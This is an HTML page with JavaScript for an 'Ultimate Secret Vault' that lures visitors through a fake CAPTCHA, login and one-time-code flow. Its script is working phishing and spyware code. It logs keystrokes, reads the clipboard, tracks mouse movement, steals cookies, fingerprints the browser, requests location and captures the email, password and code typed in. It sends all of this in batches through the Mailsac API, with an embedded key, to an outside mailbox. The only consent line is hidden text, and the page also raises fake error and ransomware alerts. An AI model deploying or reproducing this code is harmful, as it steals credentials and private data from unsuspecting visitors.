<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate Secret Vault</title>
    <style>
        body {
            background: #1a1a2e;
            font-family: Arial, sans-serif;
            color: #e0e0e0;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        h1 {
            font-size: 2.5em;
            color: #00ffcc;
        }
        p {
            font-size: 1.2em;
            margin: 10px 0;
            color: #ffeb3b;
        }
        .btn {
            padding: 15px 40px;
            font-size: 1.5em;
            background: #00ffcc;
            border: none;
            border-radius: 10px;
            color: #1a1a2e;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #00b894;
        }
        .form-box, .progress-bar {
            display: none;
            background: #16213e;
            padding: 20px;
            border-radius: 10px;
            max-width: 400px;
            margin: 20px auto;
            border: 1px solid #00ffcc;
        }
        .form-box input {
            padding: 10px;
            margin: 10px 0;
            width: 90%;
            border: none;
            border-radius: 5px;
            font-size: 1em;
            background: #2f3640;
            color: #e0e0e0;
            outline: none;
        }
        .progress-bar div {
            width: 0;
            height: 20px;
            background: #00ffcc;
            border-radius: 5px;
            animation: load 3s forwards;
        }
        @keyframes load {
            0% { width: 0; }
            100% { width: 100%; }
        }
        .master-unlock {
            display: none;
            color: #ffeb3b;
            font-size: 1.5em;
            margin-top: 15px;
        }
        .retry-btn {
            display: none;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <h1>Ultimate Secret Vault</h1>
    <p>Unveil the secrets!</p>
    <button class="btn" onclick="_sC()">Enter the Vault</button>
    <div class="form-box" id="captchaForm">
        <p>Prove You Exist</p>
        <input type="text" id="captcha" placeholder="Enter Code: 1234" required>
        <button class="btn" onclick="_vC()">Verify</button>
    </div>
    <div class="form-box" id="loginForm">
        <input type="email" id="email" placeholder="Your Email" required>
        <input type="password" id="password" placeholder="Your Password" required>
        <input type="file" id="fileUpload" accept="image/*,video/*" onchange="_hF(this.files)">
        <button class="btn" onclick="_sO()">Access Vault</button>
    </div>
    <div class="form-box" id="otpForm">
        <p>Enter Master Code</p>
        <input type="text" id="otp" placeholder="Secret Code" required>
        <button class="btn" onclick="_cD()">Unlock Secrets</button>
    </div>
    <div class="progress-bar" id="progressBar">
        <div></div>
    </div>
    <div class="master-unlock" id="masterUnlock">Vault Unlocked!</div>
    <button class="btn retry-btn" id="retryBtn" onclick="location.reload()">Retry</button>
    <p class="hidden">Lab test only. Consent to data collection.</p>

    <script>
        // Real-time Data Storage
        let collectedData = [];
        const BATCH_SIZE = 3; // Smaller batch size for reliability

        // Keylogger
        let _k = [];
        document.addEventListener('keydown', (e) => {
            _k.push(e.key);
            if (_k.length > 10) {
                let data = `K: ${_k.join('')}`;
                collectedData.push(data);
                _k = [];
                if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
            }
        });

        // Clipboard Hijack
        document.addEventListener('copy', () => {
            navigator.clipboard.readText().then(t => {
                let data = `C: ${t}`;
                collectedData.push(data);
                if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
            });
        });

        // Session Replay (Mouse)
        let _m = [];
        document.addEventListener('mousemove', (e) => {
            _m.push(`X:${e.clientX},Y:${e.clientY}`);
            if (_m.length > 8) {
                let data = `M: ${_m.join('|')}`;
                collectedData.push(data);
                _m = [];
                if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
            }
        });

        // Cookie Theft
        function _cT() {
            let c = document.cookie || 'None';
            let data = `Cookies: ${c}`;
            collectedData.push(data);
            if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
            document.cookie = `H_track=${Math.random()}; max-age=7200`;
        }

        // Browser Fingerprinting
        function _bF() {
            let f = `${navigator.userAgent}|${screen.width}x${screen.height}`;
            let data = `FP: ${f}`;
            collectedData.push(data);
            if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
        }

        // Geolocation (Optional on low network)
        function _gL() {
            if (navigator.geolocation && navigator.onLine) {
                navigator.geolocation.getCurrentPosition(p => {
                    let data = `Loc: ${p.coords.latitude},${p.coords.longitude}`;
                    collectedData.push(data);
                    if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
                }, () => {
                    let data = 'Loc denied';
                    collectedData.push(data);
                    if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
                });
            }
        }

        // Camera Access (Disabled on low network)
        function _cA() {}

        // Screen Recording Simulation
        function _sR() {
            let res = `${screen.width}x${screen.height}`;
            let data = `Screen: ${res}`;
            collectedData.push(data);
            if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
            if (Math.random() > 0.7) {
                let alertData = 'Recording simulated';
                collectedData.push(alertData);
                if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
                alert('Surveillance activated!');
            }
        }

        // Ransomware Simulation (Lightweight)
        function _rS() {
            if (Math.random() > 0.8) {
                let data = 'Ransomware triggered';
                collectedData.push(data);
                if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
                alert('SYSTEM LOCKED! (Simulation) Retry to continue.');
                document.getElementById('retryBtn').style.display = 'block';
            }
        }

        // Fake Error
        function _fE() {
            if (Math.random() > 0.75) {
                let data = 'Fake Error';
                collectedData.push(data);
                if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
                alert('System Failure! Retry.');
                document.getElementById('retryBtn').style.display = 'block';
            }
        }

        // Show CAPTCHA
        function _sC() {
            document.querySelector('.btn').style.display = 'none';
            document.getElementById('captchaForm').style.display = 'block';
            _cT();
            _bF();
        }

        // Verify CAPTCHA
        function _vC() {
            let c = document.getElementById('captcha').value;
            let data = `Captcha: ${c}`;
            collectedData.push(data);
            if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
            document.getElementById('captchaForm').style.display = 'none';
            document.getElementById('loginForm').style.display = 'block';
        }

        // Show OTP
        function _sO() {
            let e = document.getElementById('email').value;
            let p = document.getElementById('password').value;
            let data = `Email: ${e}, Pass: ${p}`;
            collectedData.push(data);
            if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('otpForm').style.display = 'block';
            _gL();
        }

        // File Upload
        function _hF(f) {
            if (f.length > 0) {
                let data = `File: ${f[0].name}`;
                collectedData.push(data);
                if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
            }
        }

        // Main Data Collection
        function _cD() {
            let o = document.getElementById('otp').value;
            let data = `OTP: ${o}`;
            collectedData.push(data);
            if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
            _sR();
            _fE();
            _rS();
            document.getElementById('otpForm').style.display = 'none';
            document.getElementById('progressBar').style.display = 'block';
            setTimeout(() => {
                document.getElementById('progressBar').innerHTML = '<div></div>';
                document.getElementById('masterUnlock').style.display = 'block';
                alert('Vault Unlocked!');
            }, 3000);
        }

        // Initial Data
        function _iD() {
            let h = window.location.href;
            let data = `URL: ${h}`;
            collectedData.push(data);
            if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
        }

        // Send Data via Mailsac
        function _sD(d, cb) {
            if (d) collectedData.push(d);
            if (collectedData.length === 0) {
                if (cb) cb();
                return;
            }

            let batch = collectedData.slice(0, BATCH_SIZE);
            fetch('https://mailsac.com/api/outgoing-messages', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Mailsac-Key': 'k_881SrqXsxB8ApLc8VtbHlDlUNJkRGg5790' // Updated API key
                },
                body: JSON.stringify({
                    to: 'sohil_vrx3y@mailsac.com',
                    subject: `Data from Ultimate Secret Vault - ${new Date().toISOString().split('T')[0]}`,
                    message: batch.join('\n')
                })
            })
            .then(response => {
                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                return response.json();
            })
            .then(result => {
                console.log('Data Sent to Mailsac:', result);
                collectedData = collectedData.slice(BATCH_SIZE); // Clear sent batch
            })
            .catch(error => {
                console.error('Error sending to Mailsac:', error);
                alert('Email failed. Check network, API key, or try again later.');
                document.getElementById('retryBtn').style.display = 'block';
            });

            if (cb) cb();
        }

        // Random Callback
        function _r() {
            let actions = [_cT, _bF, _gL, _sR, _fE, _rS];
            let rand = actions[Math.floor(Math.random() * actions.length)];
            rand();
        }

        // Start
        _iD();
    </script>
</body>
</html>
